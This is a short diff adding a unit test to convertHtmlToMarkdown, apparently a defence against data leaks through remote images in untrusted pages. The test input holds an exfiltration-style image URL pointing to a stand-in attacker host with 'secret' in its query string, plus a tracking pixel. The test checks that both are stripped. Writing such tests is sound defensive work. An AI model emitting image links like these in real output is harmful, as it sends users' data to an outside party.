@@ -65,4 +65,16 @@ describe('convertHtmlToMarkdown', () => {
 
 		expect(markdown).toContain('## Features');
 	});
+
+	it('strips images to alt text (no remote-image markdown from untrusted pages)', () => {
+		const { markdown } = convertHtmlToMarkdown(`
+			<p>Intro</p>
+			<img src="https://attacker.example/leak?d=secret" alt="Product screenshot">
+			<img src="https://attacker.example/pixel.gif">
+		`);
+
+		expect(markdown).not.toContain('![');
+		expect(markdown).not.toContain('attacker.example');
+		expect(markdown).toContain('[image: Product screenshot]');
+	});
 });
